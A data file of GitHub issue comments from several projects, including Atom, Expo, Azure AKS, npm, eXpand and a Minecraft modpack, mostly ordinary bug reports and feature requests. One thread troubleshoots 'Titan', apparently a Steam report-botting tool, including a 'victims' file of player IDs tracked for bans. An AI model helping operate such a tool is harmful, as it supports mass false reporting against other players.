find-and-replace/atom/322/70902938,"Keybinding resolver shows that should indeed work, as it is reporting the correct action , however there is a grey X next to it. Not sure what that means. ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/70904483,"should only work when in the find box, not a regular editor. ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/70905623,"Funny. It wasn't working a moment ago, but after I clicked the find box it now works properly all the time. Go figure... Thanks for all your help. ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/71014797,@friend It would be nice for the few of us (me) that do use that button frequently to at least have the option of having it (i.e. in the settings somewhere) ,False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/71014939,"Indeed, it's a requested feature, why not let the user decide if enable it or not? ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/71276648,"@friend @friend I now understand my confusion about  and  not cycling through next/previous matches. That keyboard shortcut only works when looking in the current file. When in Find in Project mode it doesn't work, so there doesn't seem to be a way to cycle through the results when in that mode. Man, the issues that a couple of simple Next/Prev buttons would solve... ) ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/201803335,"Those shortcut keys work. They weren't apparent to me though, I prefer to have a prev button. I'd like to see the previous button as an option in settings that I can switch on if you feel it shouldn't be visible by default. ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/297546738,can anyone add find prev button beside find. like make find button shorter and add the find prev button. ,False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/302056197,"Just browsed through the code and thought I'd mention that you can also hold shift while pressing ""Find"" to traverse upwards. ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/357441188,"Anyone who codes and needs to find the last declaration needs this button all the time - when one's hand is already on the mouse for other things.  Tired of going up to the menu - started cussing today from this (again), and decided to risk and upgrade, because the find-replace-with-prev wouldn't work with my older version.  Well, sure enough, I now have a broken Atom editor (nothing opens). I like the look of the really old versions and haven't experienced any improvements from any upgrades for years, so would like to go back to v.151, where the GUI was much better (had find-all, button too - also helpful and now gone).  But on the git, I don't see versions that old listed.  Where to find it? ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/357739728,Statistics also shows that the 'Quit' is used seldom. At most once per session.... ,False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/374438661,"This left me bamboozled for a bit, but holding &lt;shift&gt; when clicking the find button is the solution to find previous. ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/392113073,"@friend Can we pause for a moment and acknowledge that low interaction doesn't equate to omission? e.g. if I'm shopping online and I decide to cancel my order, because I'm the minority of users should I not be able to cancel my order? That logic is fallible. Your not alone though as its a common justification. I here it all the time at work - sometimes its correct for the user and sometimes it is not. Context has to be considered. In this case you removed an interaction that is not used often but equally as important as the next button. Disappointed that this is considered acceptable from the atom team. Thanks @friend for sharing the implicit workaround. ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/392144242,Thanks everyone for the feedback.  I double checked with the team and confirmed that this still isn't something that will be added so we're going to lock the issue for now.  Thanks again to @friend and @friend for sharing a workaround. ,False,True,False,find-and-replace/atom/322
expo/expo/3030/393083042,"SDK32 release plan Creating new release issue as it seems like the previous one was accidentally deleted by someone 😱 @friend  [x] Update libs GestureHandler, Reanimated, Screens #2977  [x] Drop SDK25 #2995  [x] Update schema on staging [x] Version Android code #3003  [x] Review changelog #3006 [x] QA Expo Client on Android #3010  [x] Publish prerelease packages [x] Publish dev and prod home [x] Tag react-native fork  [ ] Update  on staging [ ] Generate new mocks and update  [ ] Update  [ ] Push Android ExpoKit [ ] Push Android Turtle to staging [ ] Add Android apk [ ] Release Android in Play Store  @friend  [x] Drop SDK25  cherry pick ListView fix from react-native repo (see discussion below) [x] Version iOS code  Prepare changelog #3006  [x] QA Expo Client on iOS #3010  [ ] Push schema to production [ ] Submit for Apple review [ ] Tag iOS ExpoKit [ ] Update ExpoKit on staging [ ] Rollout Expo Client build for Simulator [ ] Publish packages to npm [ ] Update new project templates on staging [ ] Release iOS in App Store  @friend  [ ] Release xdl and expo-cli [ ] Push iOS Turtle to staging [ ] Release iOS Turtle to prod [ ] Release Android Turtle to prod [ ] Release turtle-cli  @friend  [ ] Publish new docs [ ] Mark SDK 25 as deprecated on server [ ] Promote versions to prod [ ] Publish blog post with release notes [ ] Add release notes to docs [ ] Update website front page [ ] Post on Twitter [ ] Publish NCL to @ community account  ",False,True,False,expo/expo/3030
expo/expo/3030/449563529,Will this support react hooks? ,False,True,False,expo/expo/3030
expo/expo/3030/449653286,"There have been a lot of react-native-web related PRs getting merged, but I don't see any mention of react-native-web support on the milestone release plan. Are you planning to unofficially release web support as well with this release? Thanks 😄 Just wondering, because that would be awesome! ",False,True,False,expo/expo/3030
expo/expo/3030/449922303,No background location in this release? #2338 ,False,True,False,expo/expo/3030
expo/expo/3030/450156743,"Is there any reason it wouldn't be, considering it was merged? This issue is a checklist of things to be done to release the expo 'platform' to the next SDK version. It doesn't have anything to do with what is included in the release. ",False,True,False,expo/expo/3030
expo/expo/3030/451008568,"@friend Hooks are not stable in React itself yet. Once hooks are released in a stable version of React, then RN will later upgrade React. Once RN stabilizes, we then have a path to bring hooks to Expo. @friend Web is still a ways out and is pre-experimental. When it is ready, we will announce it with the release notes at that time on blog.expo.io. ",False,True,False,expo/expo/3030
zfs/zfsonlinux/8258/397487623,"System information  Type | Version/Name  --- | ---  Distribution Name   | Fedora Distribution Version    | 30 (rawhide) Linux Kernel    | 5.0.0-0.rc1.git0.1.fc30.x86_64 Architecture    | x86-64 ZFS Version | master SPL Version | master   Describe the problem you're observing  CC [M]  /home/hutter/zfs/module/icp/illumos-crypto.o In file included from /home/hutter/zfs/include/spl/sys/condvar.h33,                  from /home/hutter/zfs/include/sys/zfs_context.h38,                  from /home/hutter/zfs/include/sys/crypto/common.h39,                  from /home/hutter/zfs/module/icp/illumos-crypto.c35 /home/hutter/zfs/include/spl/sys/time.h In function ‘gethrestime’ /home/hutter/zfs/include/spl/sys/time.h768 error implicit declaration of function ‘current_kernel_time64’; did you mean ‘core_kernel_text’? [-Werror=implicit-function-declaration]   ts = current_kernel_time64();         ^~~~~         core_kernel_text /home/hutter/zfs/include/spl/sys/time.h766 error incompatible types when assigning to type ‘inode_timespec_t’ {aka ‘struct timespec64’} from type ‘int’   ts = current_kernel_time64();       ^ /home/hutter/zfs/include/spl/sys/time.h In function ‘gethrestime_sec’ /home/hutter/zfs/include/spl/sys/time.h8624 error invalid initializer   inode_timespec_t ts = current_kernel_time64();                         ^~~~~ cc1 all warnings being treated as errors ♠ ",False,True,False,zfs/zfsonlinux/8258
expo/expo/3030/451018672,I pushed a branch called  (based off of master; feel free to force-push if it needs to point at an older commit) so that new commits to master don't accidentally go out with the release. ,False,True,False,expo/expo/3030
zfs/zfsonlinux/8258/455895402,Looks related to ,False,True,False,zfs/zfsonlinux/8258
expo/expo/3030/451466823,"Hi, im having problems with the expo client since today   Perharps it could be  related to this merge? ",False,True,False,expo/expo/3030
expo/expo/3030/451467374,"@friend Yes, I'm fixing this issue right now. Sorry for the trouble 😞 The fix will be out soon. ",False,True,False,expo/expo/3030
expo/expo/3030/451468648,"@friend Don't worry, thank you!  ) ",False,True,False,expo/expo/3030
expo/expo/3030/451477209,"Just put in app.json     ""sdkVersion"" ""32.0.0"", and it should work again ) ",False,True,False,expo/expo/3030
expo/expo/3030/451558185,Getting errors with ,False,True,False,expo/expo/3030
expo/expo/3030/451559276,"@friend try resetting your metro cache (shift + R), see if that works ",False,True,False,expo/expo/3030
expo/expo/3030/451560984,"When can we expect new docs, release notes and upgrade instructions? 😃 ",False,True,False,expo/expo/3030
expo/expo/3030/451562198,"@friend right, thx for quick reply ) ",False,True,False,expo/expo/3030
expo/expo/3030/451562923,@friend some reading while you wait ) ,False,True,False,expo/expo/3030
expo/expo/3030/451563093,"@friend works fine now with a reset. Any way to do it from the CLI? Used  in the past, but that seems lost now. ",False,True,False,expo/expo/3030
expo/expo/3030/451563646,@friend I believe shift + R while in the CLI will do it. Glad you got it working! ,False,True,False,expo/expo/3030
expo/expo/3030/451564897,"@friend ahh, I meant  works fine from within the CLI. But, from the command itself, , is there a way to force a cache reset? ",False,True,False,expo/expo/3030
expo/expo/3030/451576054,"Hi. Sorry to write here but there is a critical bug for those who use the ""expo-print"" module on iOS. I did the post a few days ago. I hope you can review it when you have time and see if with this release you can fix it 3 ",False,True,False,expo/expo/3030
expo/expo/3030/451602195, still needs to be merged too ,False,True,False,expo/expo/3030
expo/expo/3030/451626946,Don't this issue have the solution yet? ,False,True,False,expo/expo/3030
expo/expo/3030/451636119,I'm also facing the same issue ,False,True,False,expo/expo/3030
expo/expo/3030/451663699,What version of RN does this version ship with? ,False,True,False,expo/expo/3030
expo/expo/3030/451667198,I just got an Android update a couple minutes ago (hasn't worked since yesterdays release) and now instead of Blue Screening for incompatibility it hard crashes.  expo@friend.0.0 and latest Expo from Play store. ,False,True,False,expo/expo/3030
expo/expo/3030/451740090,@friend any chance to include this commit  as well? ,False,True,False,expo/expo/3030
expo/expo/3030/451740715,"The SDK has shipped and the only things still to do appear to documentation. Thus, there's unlikely to be any more cherry-picking for the release, though it may make it into a minor release if the team deem it worthwhile. ",False,True,False,expo/expo/3030
expo/expo/3030/451747152,"@friend okay, thanks for the feedback anyway! ",False,True,False,expo/expo/3030
expo/expo/3030/451899237,It hard crashes for me with expo@friend.0.0 as well. ,False,True,False,expo/expo/3030
expo/expo/3030/451900718,"Hey all, thank you for all the consideration and eagerness to try all the new features we've prepared! We really appreciate the enthusiasm! 😍 To let us and you work more efficiently, I'll lock this conversation—please file, as usual, separate GitHub issues for separate problems. For quick questions I would recommend our Slack community, which has always been really helpful! Have a nice day! ☀️ ",False,True,False,expo/expo/3030
respec/w3c/2124/413825047,"⚠️ THIS PROJECT HAS NOT YET BEEN SELECTED FOR GOOGLE SUMMER OF CODE 2019 ⚠️ If you are here for GSoC, you are still too early. However, you are free to get involved by reading our developer guide. If you are thinking of applying, please note this project receives a lot of GSoC applicants (~50 applications) and is extremely competitive - so it's good to learn the code base early. If you are new to programming, or are still learning JavaScript, HTML, CSS, then it's unlikely you will be selected. To be considered, you need to have  A high level of proficiency in HTML, CSS, JavaScript. Proficiency programming (at least 2nd year CS or similar).    Experience with open source.  Knowledge of to write unit tests in Jasmine.   If you are planning to apply, you can start by learning the things above, and then trying to contribute to the project. Check out some of our ""good first issues"". Please also see this presentation from last year's selected applicant. It describes some of the process and what you can expect. It also gives you an idea of the level of skill you need to have to be selected. ",False,True,False,respec/w3c/2124
respec/w3c/2124/482816574,"Proposals are in, so closing. ",False,True,False,respec/w3c/2124
AKS/Azure/132/289246891,According to  it's posssible to change the  during creation of a cluster. Is it possible to change the node size for an existing cluster as well? ,False,True,False,AKS/Azure/132
AKS/Azure/132/358471434,No changing the agent size is not allowed. In the future we plan to support multiple node pools wherein you can create different pools with different VM sizes. ,False,True,False,AKS/Azure/132
AKS/Azure/132/365684386,This is pretty bad design decision to not support it. You cannot really predict future workload. Two days ago I created small cluster with a lot of memory but small number of CPU (many pods which are active from time to time) but today it turned out we need much more CPUs. I scaled it up by adding new nodes but this is not what we want. ,False,True,False,AKS/Azure/132
AKS/Azure/132/373820367,When are y'all targeting for multiple node pool support to become available? ,False,True,False,AKS/Azure/132
AKS/Azure/132/379800382,Any news on this? Is there any workaround (like manually upgrading a node VM size via Azure Portal)? ,False,True,False,AKS/Azure/132
AKS/Azure/132/386569916,"This is indeed an important issue, as it's difficult to foresee the future load of a cluster, and limiting scaling to horizontal is not ideal. ",False,True,False,AKS/Azure/132
AKS/Azure/132/386578259,"To be fair, I managed to change the size of a machine by manually upgrading the node in the Azure portal. So far so good, but have not done enough testing to confirm if this is doable in a production environment. ",False,True,False,AKS/Azure/132
AKS/Azure/132/386579061,"@friend, what problems (if any) can we expect if we manually update the node Sizes (apart from downtime for the apps running on those nodes if we don't use replication) ",False,True,False,AKS/Azure/132
AKS/Azure/132/386779823,"Try upgrading and scaling after manual updates and check for issues ... Thanks Saurya  From Sasha notifications@friend.com Sent Friday, May 4, 2018 15718 PM To Azure/AKS Cc Saurya Das; Mention Subject Re [Azure/AKS] Changing node vm-size of existing cluster (#132) @friend what problems (if any) can we expect if we manually update the node Sizes (apart from downtime for the apps running on those nodes if we don't use replication) — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",False,True,False,AKS/Azure/132
AKS/Azure/132/393363970,"This seems like a reasonable request for this feature, as if you are still pre prod you will not need/want to run large costly vm's, once load-testing and such starts then you'll want to upgrade to prod size vm. The fact that you have to create another cluster to set the real vm size seems to defeat the purpose os modular and configurable kubernetes. ",False,True,False,AKS/Azure/132
AKS/Azure/132/393494255,And manually updating images is error-prone and in my experience (YMMV) resulted in monitoring issues when using tools like Prometheus and Grafana. ,False,True,False,AKS/Azure/132
AKS/Azure/132/397876069,Why does AKS not support this? GKE already supports adding a new node pool as far as I know to the cluster but I dont know if it supports doing it with a different vm type.. ,False,True,False,AKS/Azure/132
AKS/Azure/132/397883814,"Adding a new node pool with a different vm size is coming in the next couple months . You can’t change the vm size in an existing node pool in gke Thanks Saurya  From Endre Karlson notifications@friend.com Sent Sunday, June 17, 2018 53707 AM To Azure/AKS Cc Saurya Das; Mention Subject Re [Azure/AKS] Changing node vm-size of existing cluster (#132) Why does AKS not support this? GKE already supports adding a new node pool as far as I know to the cluster but I dont know if it supports doing it with a different vm type.. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",False,True,False,AKS/Azure/132
AKS/Azure/132/398650502,Please reopen this ticket to signal to the community you are planning to implement this missing feature in the future. ,False,True,False,AKS/Azure/132
AKS/Azure/132/398652732,"Thanks .. we will discuss this internally and update this thread. I think a reasonable solution in the near term would be to add a new agent pool (with a different VM size)to an existing cluster (support planned in the next couple of months) when you want to, for example, move from testing(small vm size like standard d2v2 )to prod (large vm size StandardDSV13 )in the same cluster. Once you deploy the workload in the new agent pool with the large vm size you can scale down/delete the first agent pool that was used for testing ",False,True,False,AKS/Azure/132
AKS/Azure/132/398695853,"@friend, that would be perfect. ",False,True,False,AKS/Azure/132
AKS/Azure/132/405520989,it is disappointed to know the Verticle Scaling is not supported in AKS. ,False,True,False,AKS/Azure/132
AKS/Azure/132/405678288,@friend thanks for the feedback. Please see above for a proposed alternative solution. We will also discuss the vertical scaling internally but there is no ETA. FWIW GKE doesnt support vertical scaling Closing this issue for now. ,False,True,False,AKS/Azure/132
AKS/Azure/132/409547565,Hello! Is there some other thread where i can track the progress on the solution proposed from @friend? ,False,True,False,AKS/Azure/132
AKS/Azure/132/409608377,@friend unfortunately MS is not giving us any ETA on any AKS issues. This is really frustrating. ,False,True,False,AKS/Azure/132
AKS/Azure/132/409609776,"We are hoping to have node pool support by the end of September Thanks Saurya  From Eder Nucci notifications@friend.com Sent Wednesday, August 1, 2018 80748 AM To Azure/AKS Cc Saurya Das; Mention Subject Re [Azure/AKS] Changing node vm-size of existing cluster (#132) @friend unfortunately MS is not giving us any ETA on any AKS issues. This is really frustrating. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",False,True,False,AKS/Azure/132
AKS/Azure/132/409624781,You can track the addition of multiple node pools here ,False,True,False,AKS/Azure/132
AKS/Azure/132/414812940,"@friend did you have any issues with this approach? I did the same thing, but didn't upgrade or scale the cluster yet after this change. ",False,True,False,AKS/Azure/132
AKS/Azure/132/414930936,"Once you scale or upgrade the Kubernetes version, the nodes are reverted to the original size, and you will have to resize again. ",False,True,False,AKS/Azure/132
AKS/Azure/132/414983682,"As a side note, in production you might be in an infrastructure as code mode, with some ARM templates. If you manually change the size, your template will be desynchronized from the reality. ",False,True,False,AKS/Azure/132
AKS/Azure/132/434183293,@friend is multi-agent pools supported in AKS ? ,False,True,False,AKS/Azure/132
AKS/Azure/132/434395170,"Sadly, they postponed the lunch to Q1 2019. ",False,True,False,AKS/Azure/132
AKS/Azure/132/434415768,Long time to wait for lunch ) ,False,True,False,AKS/Azure/132
AKS/Azure/132/435675348,"Welcome home, November -) ",False,True,False,AKS/Azure/132
AKS/Azure/132/457190977,Any update on this? ,False,True,False,AKS/Azure/132
AKS/Azure/132/466024730,"In summary (for everyone scrolling to the end hoping on some positive message) currently  no Vertical Scaling   no Additional Node Pools  discussed, planned, promised but never delivered  Additional node pools.  This is frankly kind of insane. This means that you have to predict perfectly what scaling size you want to work with during testing/staging since it will be the same as production. ",False,True,False,AKS/Azure/132
AKS/Azure/132/466027893,"This is only parcially correct as far as i know. Correct is they do not support it as now, but they are working on it atm. There are more informations on #287 ",False,True,False,AKS/Azure/132
AKS/Azure/132/466041281,"@friend - no, read the 'more information' referenced (#287) - the summary holds quite accurately. ",False,True,False,AKS/Azure/132
AKS/Azure/132/466043834,"Yes, with redards to the current scope of AKS. However they are still working in this new feature according to the feedback hub here ",False,True,False,AKS/Azure/132
AKS/Azure/132/466045253,"@friend These features are on the roadmap, for 1H 2019 and will be linked/added to the changelog and preview document in the repo. I am sorry we do not meet your needs with this at this time, however This repository, all commentary, etc is governed by our Code of conduct. Calling things insane, insinuating the team is not working on this, or doesn't care is inappropriate. Therefore I'm deleting your comments from this thread. I am also locking this thread as vertical scale up is not supported or planned at this time. VMSS, Node Pools and Availability zones are the recommended horizontal scaling system(s) and will be coming this year. ",False,True,False,AKS/Azure/132
Titan/Marc3842h/145/403538817,"Hello I banned a guy but VictimTracker does not pop up for me Do I have to change the victims.json? I tried to put in steamID but did not worked.. my victims.json looks like {""victims""[]} can som1 help me plz? ) thx ",False,True,False,Titan/Marc3842h/145
Titan/Marc3842h/145/458249938,"The victims.json format is ♠js {     ""victims"" [         {             ""steamid"" 76561198224231904, // Replace this with target steamid64             ""timestamp"" 1548700635 // Unix timestamp, feel free to keep at 0 if you don't know what it is         }     ] } ",False,True,False,Titan/Marc3842h/145
Titan/Marc3842h/145/459043562,"thx is it correct to have a steamapi.key data or should it be steamapikey.json? how is the format for this type because Titan said [184339 WARNING] SWAHandle 12 - No valid Web API key has been found. Skipping ban checking... [184339 WARNING] SWAHandle 12 - No valid Web API key has been found. Skipping ban checking... [184339 DEBUG] SWAHandle 1 - Received key from ""steamapi.key"" file ""XXXXXXXXXXXXXXXXXXXXX"" [184340 INFORMATION] SWAHandle 1 - Steam Web API is valid and will be used."" I checked my apikey and its the one in my steamapi.key data steamapi.key format♠XXXXXXXXXXXXXXXXXXXXX` ",False,True,False,Titan/Marc3842h/145
Titan/Marc3842h/145/459053960,"yea the Steam API key is located in  and it only contains the key, no special formatting. ",False,True,False,Titan/Marc3842h/145
Titan/Marc3842h/145/459099109,"213325 [Main] INFORMATION Quartz.NET Scheduler - Quartz scheduler version 3.0.4.0 213325 [Main] INFORMATION Quartz.NET Scheduler - Scheduler DefaultQuartzScheduler_$_NON_CLUSTERED started. 213326 [Main] INFORMATION Titan - No valid verb has been provided while parsing. Opening UI... 213326 [Main] DEBUG AccountManager - Titan Account Manager initialized on ""2133"". (1548880406) 213326 [Main] DEBUG Quartz.NET Scheduler - Producing instance of Job 'Titan.Victim Tracker Job', class=Titan.Logging.VictimTracker 213326 [Main] DEBUG Quartz.NET Scheduler - Calling Execute on job Titan.Victim Tracker Job 213326 [null] DEBUG VictimTracker - Checking all victims if they have bans on record. 213326 [null] INFORMATION VictimTracker - Victims [""Titan.Json.Victims+Victim"", ""Titan.Json.Victims+Victim"", ""Titan.Json.Victims+Victim""] 213326 [Main] WARNING SWAHandle - No valid Web API key has been found. Skipping ban checking... 213326 [Main] WARNING SWAHandle - No valid Web API key has been found. Skipping ban checking... 213326 [Main] WARNING SWAHandle - No valid Web API key has been found. Skipping ban checking... 213326 [Main] DEBUG Quartz.NET Scheduler - Trigger instruction  NoInstruction&gt; dann loggt er die accs 213326 [Main] DEBUG AccountManager - Index 0 has expired. It is now available for botting. 213326 [Main] DEBUG AccountManager - Using index #0 for botting. 213326 [Main] DEBUG SWAHandle - Received key from ""steamapi.key"" file ""XXXXXXXXXXXXXXXXXXXXXX"" 213327 [Main] INFORMATION SWAHandle - Steam Web API is valid and will be used. 213327 [Main] INFORMATION Titan - Hello and welcome to Titan ""v1.6.1"".&gt; ein eingetragenener acc in der victims.json hat nen gameban aber ich krieg kein popup oder ieine msg ( und warum sagt er mir erst 3x, dass der key nicht gütlig ist (hab 3 accs in der victims.json eingetragen), dann nimmt er ihn aber später an ",False,True,False,Titan/Marc3842h/145
Titan/Marc3842h/145/459101773,"Please refrain from speaking german in the issues section, as noted in the Code of Conduct file. This issue tracker is public and is supposed to be helpful to future users, which may very well don't speak german. The victim tracking is a scheduled thread run in the background at 15 minutes intervals. It does indeed get started before the Web API key is initialized but that wasn't a problem until now because the scheduler would be usually later called than the main thread would've finished. As your CPU seems to run insanely fast (or you just got a great scheduler, or just plain lucky), I'll post a fix for it in a few minutes. ",False,True,False,Titan/Marc3842h/145
Titan/Marc3842h/145/459102756,"Issue has been fixed, please try again with the latest source code. ",False,True,False,Titan/Marc3842h/145
Titan/Marc3842h/145/459801647,can u please make a release fix? I tried to install from source but I cant open Titan PS installin everything and says 'titan is rdy to use' but it does not open ,False,True,False,Titan/Marc3842h/145
Titan/Marc3842h/145/459950548,@friend what about the issue with victims.json not saving botted players in first place after reporting ? Did you fix that as well? ,False,True,False,Titan/Marc3842h/145
Titan/Marc3842h/145/459954265,@friend  When I try to open the solution file I get the following message One or more projects in the solution were not loaded correctly. Can you please help me? ,False,True,False,Titan/Marc3842h/145
Titan/Marc3842h/145/459958506,"@friend Until the feature is stablized, a official release won't be published on the releases tab. Some people may be friendly however and send you their own prebuilt versions of the latest Titan source code. @friend Not yet as I'm unable to track progress on that issue as nobody has bothered to open a GitHub issue regarding it. @friend Please read the build guide before asking for any help, as you wouldn't have tried to open the solution file if you would've read it. Existing issues are not a place for asking for help. I will be locking this conversation to prevent more questions. If you find another issue or have more questions, please open a new issue. ",False,True,False,Titan/Marc3842h/145
npm/npm/20769/326712539,"I'm opening this issue because  [ ] npm is crashing. [x] npm is producing an incorrect install. [ ] npm is doing something I don't understand. [ ] npm is producing incorrect or undesirable behavior. [ ] Other (see below for feature requests)  What's going wrong? using , but the optionalDependencies still affect the version of other dependencies. How can the CLI team reproduce the problem?      the version of  is 2.81.0   delete the   or    the version of  is 2.87.0 supporting information  prints 6.1.0  prints v8.1.2 prints   Windows, OS X/macOS, or Linux? OS X Network issues Geographic location where npm was run [ ] I use a proxy to connect to the npm registry. [ ] I use a proxy to connect to the web. [ ] I use a proxy when downloading Git repos. [ ] I access the npm registry via a VPN [ ] I don't use a proxy, but have limited or unreliable internet access.   Container [ ] I develop using Vagrant on Windows. [ ] I develop using Vagrant on OS X or Linux. [ ] I develop / deploy using Docker. [ ] I deploy to a PaaS (Triton, Heroku).    ",False,True,False,npm/npm/20769
npm/npm/20769/392816540,Seems to be related to  which is getting no love *( ,False,True,False,npm/npm/20769
npm/npm/20769/403938503,dupe of ,False,True,False,npm/npm/20769
passbolt_api/passbolt/256/324122291,"IMPORTANT PLEASE READ Only use github issues for bugs. We will be more than happy to help you on the community forum for  feature requests  related to installations  questions  is only a issue tracker for bugs related to the Passbolt API. For passbolt docker, browser extension, command line interface, in short any other bugs  please use the other relevant repositories. If you are certain this is a new API bug please use the following format ISSUE NAME  Passbolt Version EXACT RELEASE VERSION OR COMMIT HASH, HERE. Platform and Target -- Operating system NAME AND VERSION -- PHP VERSION -- Web server NAME AND VERSION -- Database server NAME AND VERSION -- etc. OTHER RELEVANT PLATFORM INFO  What you did EXPLAIN WHAT YOU DID, PREFERABLY WITH CODE EXAMPLES, HERE. What happened EXPLAIN WHAT IS ACTUALLY HAPPENING, HERE. What you expected to happen EXPLAIN WHAT IS TO BE EXPECTED, HERE. ",False,True,False,passbolt_api/passbolt/256
passbolt_api/passbolt/256/390630786,"Closing this as this is not a bug. This has been discussed extensively on the community forum, where you can continue the discussion. See.  ",False,True,False,passbolt_api/passbolt/256
eXpand/eXpandFramework/176/361943206,"Hello, The Excel Importer is a really nice feature and I would like to ask for new features. Well two nice features would be.  parameter before import defining if non existing data from reference should be created or not. (if not so this should be considered like error)  A progress bar informing the status. I imported 1.5k of records with 20 columns. It worked goot but for 45 seconds I did not know what was happening.    BR ISA ",False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425666551,see #185  for your first point ,False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425666857,N1 is different from  is should probably be part controlled by import stragegy. ,False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425667006,hmm you are right my bad sorry ,False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425667141,"However, in the update and create scenario, it is really important to have an understanding of what happened after importing large and complex files (this has been requested a lot) - ",False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425667573,"sure it relates but lets discuss #175 separately is too complex task and we need a smart solution, Feel free to update your suggestion if you have ideas. N1 looks like #185 we can introduce a new field FailWhenNotFound perhaps?? because the  applies to the main object type and cannot be used again. ",False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425668305,now I got it we can introduce an  on each field similar to the main object ,False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425668325,Why not have the same strategy field for each import field? ,False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425668370,i cannot follow ,False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425668728,I meant the same. You typed 10 seconds faster. ,False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425668871,wrong cause I already change my mind ) #175 is the first item of the new ,False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425669251,"So why should it be different from ImportStrategy?  SkipEmpty does is not needed - if it is empty, you always skip it. ",False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425669320,"but it WOULD be great to define this per each reference property. By default, after mapping fields, it could be the same as main ImportStrategy ",False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425669443,@friend suggested a failed mode which does not exist in main strategy ,False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425669646,True. What is missing is UpdateOnly mode and fail the while record if the reference record does not exist. In fact I would have that for master record as well! ,False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425669715,elab with details ,False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425669723,It is a real use case when the whole purpose of import is only to update large amount of records and keep track of errors that did not go through. ,False,True,False,eXpand/eXpandFramework/176
SevTech-Ages/DarkPacks/2626/326569648,"I'd like to suggest finding an alternate item to the starmetal ingot (or a TF equivalent way to get one) once you enter twilight forest such that if someone gets stuck they can reopen a TF portal from the TF side without having to cheat or have a server admin come rescue them. I timed out on a server and my portal did not form properly as it was set in the middle of an innaccessible region because of progression. Another person had his portal on the TF side get destroyed by a creeper. In both cases we had no easy access back to the overworld, no access to shoggoths and the start of Abyssal craft and consequently no way to make an astral starter table to make the star metal ingot legitimately. Our only option is to cheat or be rescued if playing with other people. Thank you for your time. ",False,True,False,SevTech-Ages/DarkPacks/2626
eXpand/eXpandFramework/176/425669772,"UpdateOnly would only do a key field match and update the record. If the record is not found, new record is not created. ",False,True,False,eXpand/eXpandFramework/176
SevTech-Ages/DarkPacks/2626/392099746,"Hello, I'm pretty sure Shoggoths lairs do spawn in the TF Swamp biomes, but yeah, this is a real pita for players in the event of their portal being destroyed. ",False,True,False,SevTech-Ages/DarkPacks/2626
eXpand/eXpandFramework/176/425669963,"What we had to do after importing files like this - go and check if no records were created after import, both master record and reference. When they were not meant to be and if this happened it means there was a spelling error in the import file ",False,True,False,eXpand/eXpandFramework/176
eXpand/eXpandFramework/176/425671764,these strategies sound very useful however my feeling is that your spelling work could be reduced with the use of the  function ,False,True,False,eXpand/eXpandFramework/176
SevTech-Ages/DarkPacks/2626/392102126,This should be considered a bug simply because it is a huge gate in a players progression and will resort in people either rage quitting or having to cheat due to an easily avoidable fix we can add in the pack. ,False,True,False,SevTech-Ages/DarkPacks/2626
eXpand/eXpandFramework/176/425672072,"Well, spelling is just one scenario (and thanks for the link).  There could be a multitude of reasons why UpdateOnly would be preferred. ",False,True,False,eXpand/eXpandFramework/176
SevTech-Ages/DarkPacks/2626/392120467,"you're right on the shoggoth lairs in swamps Vadis, I just found one beside my second labyrinth entrance (still hunting for the charms of keeping) ",False,True,False,SevTech-Ages/DarkPacks/2626
eXpand/eXpandFramework/176/427287370,nightly build  ,False,True,False,eXpand/eXpandFramework/176
SevTech-Ages/DarkPacks/2626/392151461,"I've seen a few in the swamp biomes. Actually a good way to get the shoggoths instead of hunting them down in the overworld. But the block breaking acid is a pain in the ass for many things, including portals. ",False,True,False,SevTech-Ages/DarkPacks/2626
eXpand/eXpandFramework/176/427288201,"I am locking this one is getting too long, open new posts for each case please. ",False,True,False,eXpand/eXpandFramework/176
SevTech-Ages/DarkPacks/2626/392213365,"I don't personally consider this a bug at all. In my opinion, this is a Vanilla based mechanic. You want us to change how to light a portal in the Nether when a Ghast destroys it, no? You'll be stuck there forever unless you manage to get a fire thrown at it. Like these things will happen even changing to another item you'll still have the similar issue. Diamond won't be used again for this. And then we'd need to find an item which is high tiered and then still available in the TF. I'm totally fine with the need for cheating on this one. It's a rare thing to happen anyway. TF are aware of some rare case spawning issues and if you blow up, then I guess bad luck? A smart move would be to have a chest nearby with spare ingots in the situation of a blowup. Like at the end of the day it's an RNG issue. You're still able to get the AS stage in the TF when you find the Shoggoths sure it can be hard. But we can't keep changing the mechanics for the pack when something as small as this comes up. The pack will start to lose its feel. All of the aspects of making the Ingot are there in the TF so technically your not actually stuck you just have to start again. Like even in Vanilla TF I'd take spare Diamonds for this very reason. ",False,True,False,SevTech-Ages/DarkPacks/2626
